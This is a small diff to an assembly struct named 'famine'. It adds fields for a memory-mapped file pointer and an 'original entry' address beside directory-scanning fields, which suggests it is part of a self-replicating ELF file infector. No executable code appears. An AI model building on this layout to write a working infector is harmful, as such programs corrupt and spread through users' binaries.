@@ -62,7 +62,9 @@ struc famine
     .fd_file            resq    1
     .dirent_struc       resb    1024
     .dir_name_pointer   resq    1
-    .file_original_len  resd    1 
+    .file_original_len  resd    1
+    .mmap_pointer       resq    1
+    .original_entry     resq    1 
 endstruc
 
 
